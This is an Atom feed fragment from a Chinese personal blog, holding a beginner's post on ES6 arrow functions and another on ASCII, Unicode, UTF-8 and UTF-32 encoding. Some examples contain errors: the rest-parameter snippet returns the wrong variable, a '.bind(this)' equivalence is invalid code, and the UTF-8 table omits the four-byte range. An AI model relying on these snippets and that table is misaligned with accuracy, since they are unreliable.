      &lt;p&gt;Javascript中的this指向问题应该算是前端面试中最喜欢被问到的问题之一吧！网上相关的文章数不胜数，做为前端新人，自己也稍微的扯下对Javascript中this的指向的一些理解和总结吧！&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="this" scheme="http://summerGreenTea.github.io/tags/this/"/>
    
  </entry>
  
  <entry>
    <title>学习ECMAScript6系列之箭头函数</title>
    <link href="http://summerGreenTea.github.io/2015/12/24/es6-arrow-function/"/>
    <id>http://summerGreenTea.github.io/2015/12/24/es6-arrow-function/</id>
    <published>2015-12-24T14:05:17.000Z</published>
    <updated>2016-03-02T02:58:00.273Z</updated>
    
    <content type="html">&lt;p&gt;&lt;strong&gt;Arrow Function&lt;/strong&gt;让我想起了python的&lt;code&gt;lambda&lt;/code&gt;函数,其实很多语言都支持lambda函数，包括javascript,但是javascript的lambda函数就显得那么的无味。es6的Arrow Function的到来这改变了我们书写函数表达式的方式，也给javascript带来了真正的lambda函数式。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;下面通过一小段简单的代码来体验下 Arrow Function.&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$(&lt;span class=&quot;string&quot;&gt;&#39;#id&#39;&lt;/span&gt;).click(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;).each(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;o&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(o);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这个是在ES5中的一段jQuery写法，但是在ES6中可以这样写：&lt;br&gt;&lt;figure class=&quot;highlight coffeescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$(&lt;span class=&quot;string&quot;&gt;&#39;#id&#39;&lt;/span&gt;).click(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;).each(o =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(o)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;什么感觉，不知道你是什么感受，反正我很爽，不用写那个又长看起来又很怪(cuo)的&lt;code&gt;function&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;语法&quot;&gt;&lt;a href=&quot;#语法&quot; class=&quot;headerlink&quot; title=&quot;语法&quot;&gt;&lt;/a&gt;语法&lt;/h3&gt;&lt;p&gt;我觉得Arrow Function 算是所有ES6的features中最简单的一个，简单又实用(简直就是我的小水杯)，我都有点按捺不住心中的小激动。还是赶紧快快的进入语法学习吧！&lt;br&gt;Arrow Function 语法可以简单的概括为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ArrowFunction : ArrowParameters =&amp;gt; ConciseBody
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;相当任性的简洁，用前面的那个栗子来说明一下。&lt;br&gt;click方法闯入的回调函数就是一个&lt;code&gt;ArrowFunction&lt;/code&gt;，那么在那么ArrowFunction中的括号就是一个&lt;code&gt;ArrowParameters&lt;/code&gt;,那么那个大括号括起来的自然就是&lt;code&gt;ConciseBody&lt;/code&gt;(官方给的名称，译为:简洁的函数体)。ArrowParameters和ConciseBody之间用一个&lt;strong&gt;=&amp;gt;&lt;/strong&gt;相连。这就组成了一个ArrowFunction。当然还有一些注意点。&lt;br&gt;如果我们的&lt;code&gt;ArrowParameters&lt;/code&gt;的参数个数为0，也就是不传入参数的话，那么需要一个空的小括号来表明这是一个无参的函数;如果这个参数为一个，则可以省略小括号；如果参数个数大于一，这一定要使用小括号括起来。&lt;br&gt;&lt;figure class=&quot;highlight coffeescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$(&lt;span class=&quot;string&quot;&gt;&#39;#id&#39;&lt;/span&gt;).hover(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	....&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)  &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; 参数个数为&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$(&lt;span class=&quot;string&quot;&gt;&#39;#id&#39;&lt;/span&gt;).hover(e =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;) &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; 参数个数为&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;，可以省略小括号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$(&lt;span class=&quot;string&quot;&gt;&#39;.class&#39;&lt;/span&gt;).each(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;(ele, index)&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;) &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; 参数为多个，则不可以省略小括号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还可以配合reset参数和变量解构一起使用使用:&lt;br&gt;&lt;figure class=&quot;highlight dart&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; nums = (...&lt;span class=&quot;built_in&quot;&gt;num&lt;/span&gt;) =&amp;gt; nums&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nums(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;);   &lt;span class=&quot;comment&quot;&gt;// [1,2,3,4]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; person = (&amp;#123;name, age&amp;#125;) =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;name:&#39;&lt;/span&gt; + name + &lt;span class=&quot;string&quot;&gt;&#39;,age:&#39;&lt;/span&gt; +age;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person(&amp;#123;name: &lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, age: &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;&amp;#125;) &lt;span class=&quot;comment&quot;&gt;// name:summer,age:19&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;下面来看看&lt;code&gt;ConciseBody&lt;/code&gt;。&lt;br&gt;如果我们的ConciseBody就是我们要返回的值的时候，就可以直接在&lt;code&gt;=&amp;gt;&lt;/code&gt;后面加上你要返回的内容。&lt;br&gt;&lt;figure class=&quot;highlight ceylon&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;const &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; = o =&amp;gt; o.&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//等同于&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;(o) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; o.&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;.bind(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果我们要返回一个对象的话，那么这个对象外要包上一堆小括号，以免js解析器将返回的对象解析成函数体:&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; newObject = () =&amp;gt; (&amp;#123;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//等同于&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;newObject&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;Arrow-Function带来的变化&quot;&gt;&lt;a href=&quot;#Arrow-Function带来的变化&quot; class=&quot;headerlink&quot; title=&quot;Arrow Function带来的变化&quot;&gt;&lt;/a&gt;Arrow Function带来的变化&lt;/h3&gt;&lt;p&gt;前面我们简单的说了下Arrow Function的一些语法知识点和一些需要注意的点，现在就来分析下 Arrow Function 带来的真正的改变。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;this&lt;/code&gt;对象是定义的时候所在的对象，而不是使用时所在的对象&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; handler = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;value&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;addValue&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		setTimeout(() =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.value ++&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;, &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码中setTimeout中回调如果是匿名函数(普通函数)的话，那么其中的this是指向全局对象的，因为是函数调用模式(关于this的指向问题可以看我另外一篇博客)，但是使用了箭头函数，那么其中的this指向就是定义的函数所在的对象，也就是&lt;code&gt;handler&lt;/code&gt;。还有一个问题需要注意的是，在箭头函数中，this其实是不存在，也就是我们利用apply, call , bind等修改函数内部this指向的方法是不管用的。还有&lt;code&gt;super&lt;/code&gt;,&lt;code&gt;arguments&lt;/code&gt;,&lt;code&gt;new.target&lt;/code&gt;这三个变量在建有函数中也是不存在的。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;箭头函数不可以当做构造函数来使用，也就是说不能使用new命令&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight dart&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; Perosn = (name, age) =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.name = name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.age = age;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; p = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Perosn(&lt;span class=&quot;string&quot;&gt;&#39;summer&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;19&lt;/span&gt;);  &lt;span class=&quot;comment&quot;&gt;//TypeError&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;不可以使用&lt;code&gt;yield&lt;/code&gt;命令，所以箭头函数不能用做Generator函数&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h3&gt;&lt;p&gt;箭头函数本质上就是lambda表达式，网上有许多人认为箭头函数就是ES6的又一个语法糖，而且降低了代码的可读性。在ES6标准发布的这么一段时间里，是是非非的争论总是无休止的。个人觉得语法糖这么一说不像那么回事，至于代码的可读性，那就是代码编写风格和水平的问题了。总而言之，言而总之，ES6的时代已经到来，其众多的新特性必将会改变现在前端开发的布局，好坏留给后人去说吧！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Arrow Function&lt;/strong&gt;让我想起了python的&lt;code&gt;lambda&lt;/code&gt;函数,其实很多语言都支持lambda函数，包括javascript,但是javascript的lambda函数就显得那么的无味。es6的Arrow Function的到来这改变了我们书写函数表达式的方式，也给javascript带来了真正的lambda函数式。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>学习字符集编码</title>
    <link href="http://summerGreenTea.github.io/2015/12/08/learn-unicode/"/>
    <id>http://summerGreenTea.github.io/2015/12/08/learn-unicode/</id>
    <published>2015-12-08T08:30:42.000Z</published>
    <updated>2016-03-02T02:58:00.306Z</updated>
    
    <content type="html">&lt;p&gt;曾近有段时间在学php的时候，总是会碰到往数据库中插入数据乱码问题。前几天JSP老师在课上演示往SQLServer中插入数据，结果也是乱码一大堆了，调试了很久才正常。”字符乱码问题会伴随你们的程序人生”，他说这是这节课最重要的知识点。所以，身为一名未来的程序员，必要的字符编码知识是我们所必须掌握的。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;我们先来了解一下一些基本概念:&lt;br&gt;&lt;strong&gt;字符集&lt;/strong&gt;：是一个系统支持的所有抽象字符的集合。字符是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。&lt;br&gt;&lt;strong&gt;字符集编码&lt;/strong&gt;：是一套法则，使用该法则能够对自然语言的字符的一个集合（如字母表或音节表），与其他东西的一个集合（如号码或电脉冲）进行配对。即在符号集合与数字系统之间建立对应关系，它是信息处理的一项基本技术。通常人们用符号集合（一般情况下就是文字）来表达信息。而以计算机为基础的信息处理系统则是利用元件（硬件）不同状态的组合来存储和处理信息的。元件不同状态的组合能代表数字系统的数字，因此字符编码就是将符号转换为计算机可以接受的数字系统的数，称为数字代码。&lt;br&gt;简单来说就是，在计算机内部，我们用0和1来表示数据，也就是二进制，我们把不同种类的语言和这种语言中的字符书写方式用某种规则转化成计算机能识别的二进制数据。&lt;/p&gt;
&lt;h2 id=&quot;ASIIC码&quot;&gt;&lt;a href=&quot;#ASIIC码&quot; class=&quot;headerlink&quot; title=&quot;ASIIC码&quot;&gt;&lt;/a&gt;ASIIC码&lt;/h2&gt;&lt;p&gt;早期的计算机由于是美国人发明的，所以设计之初呢，美国人将英文中的26个英文字母、控制字符（回车键、退格、换行键等和阿拉伯数字用一个字节(八位二进制)来表示,这样最多可以定义256个字符，这个就是ASSIC码。在ASSIC码中，一共规定了128个字符，这些字符只占用了一个字节长度的后七位。&lt;br&gt;&lt;img src=&quot;/2015/12/08/learn-unicode/ascii1.png&quot; alt=&quot;[ASCII码表1]&quot; title=&quot;[ASCII码表1]&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2015/12/08/learn-unicode/ascii1.png&quot; alt=&quot;[ASCII码表2]&quot; title=&quot;[ASCII码表2]&quot;&gt;&lt;br&gt;但是随着计算机的发展和普及，越来越多的国家开始使用计算机，不同的国家有不同的字母和语言，而传统的ASSIC的八位二进制最多表示256个字符显然已经满足不了各个国家的字符编码需求了。那么 &lt;em&gt;Unicode&lt;/em&gt; 出现了。&lt;/p&gt;
&lt;h2 id=&quot;Unicode&quot;&gt;&lt;a href=&quot;#Unicode&quot; class=&quot;headerlink&quot; title=&quot;Unicode&quot;&gt;&lt;/a&gt;Unicode&lt;/h2&gt;&lt;p&gt;Unicode的制定方是ISO(国际标准制定组织)，它们的解决方法简单除暴—-把全世界的字母和符号都弄成一中编码方式表示，他们管这个叫Unicode标准。它定义Unicode字符集和Unicode的编码方式(后面会提到)。&lt;br&gt;Unicode规定字符的表示方式为 &lt;em&gt;U+&lt;/em&gt; 加上一组十六进制数，这租十六进制数叫做&lt;strong&gt;码点&lt;/strong&gt;，Unicode分十七个的平面，整体能表示的字符数量为2&lt;sup&gt;21&lt;/sup&gt;。一个基本平面，表示的范围是&lt;strong&gt;U+0000~U+FFFF&lt;/strong&gt;,另外十六个平面表示的范围是&lt;strong&gt;U+010000~U+10FFFF&lt;/strong&gt;。&lt;br&gt;对于之前的ASSIC码表示的字符，则采用原先的ASSIC码来表示，只是在原先的ASSIC码的基础上在前面加8个0来组成两个字节(这种方式带来的问题是，对于前面127个字符，如果利用Unicode存储这会多浪费一个字节的空间)。其他的字符的编码也是对应排列下去，如果2个字节的长度还不能满足现有的字符，则用3个或4个字节来表示，等等。其实Unicode的字符表示方式给人的感觉是非常大气的，但是这种表示方式带来的问题也很多。&lt;br&gt;首先，就是前面提到的，对于原先的ASSIC码所对应的字符，在Unicode中表示的话则多浪费了一个字节的的存储空间。再一个就是全世界的字符非常多，那么就需要更长的字节来表示一个字符，那么对于原本只需要一个或两个字节表示的字符，我们现在给改为统一的3个或4个字节来表示，造成的结果解释前者的字符编码前面加了很多个0，这对于存储空间是个极大的浪费。Unicode的编码还无法来计算机知道，字符的编码长度，这样计算机也就不知道，这个编码是代表一个字符还是两个字符或者其他的。&lt;br&gt;所以早期的Unicode推广很不顺利，随着互联网的出现，这些问题都得到了解决，人们根据原来的Unicode的编码规则用不同的方式来进行实现，并一步一步的解决了这些问题。&lt;/p&gt;
&lt;h3 id=&quot;UTF-8编码&quot;&gt;&lt;a href=&quot;#UTF-8编码&quot; class=&quot;headerlink&quot; title=&quot;UTF-8编码&quot;&gt;&lt;/a&gt;UTF-8编码&lt;/h3&gt;&lt;p&gt;UTF-8是以字节为单位来对Unicode进行编码,它的编码方式可以总结为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。&lt;br&gt;2.&lt;br&gt;对于n字节的符号（n&amp;gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。&lt;br&gt;| Unicode编码(十六进制) | UTF-8 字节流(二进制)         |&lt;br&gt;| ————- |:————-:|&lt;br&gt;| 00000000 - 0000007F | 0xxxxxxx |&lt;br&gt;| 00000080 - 000007FF | 110xxxxx 10xxxxxx |&lt;br&gt;| 00000800 - 0000FFFF | 1110xxxx 10xxxxxx 10xxxxxx |&lt;br&gt;| 00200000 - 03FFFFFF | 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx |&lt;br&gt;| 04000000 - 7FFFFFFF | 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx |&lt;br&gt;UTF-8的特点是节省空间，它的前128个字符的编码和ASSIC码一样，都是用一个字节表示，它也就成为了当下计算机最流行的编码方式。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;UTF-32编码&quot;&gt;&lt;a href=&quot;#UTF-32编码&quot; class=&quot;headerlink&quot; title=&quot;UTF-32编码&quot;&gt;&lt;/a&gt;UTF-32编码&lt;/h3&gt;&lt;p&gt;UTF-32又称为&lt;strong&gt;USC-4&lt;/strong&gt;。&lt;br&gt;UTF-32的编码都使用4个字节来表示一个字符，这种编码方式是最浪费存储空间的，但是优点就是方便查找，在HTML5的标准中，已经明确网页不能使用UTF-32来进行编码。&lt;/p&gt;
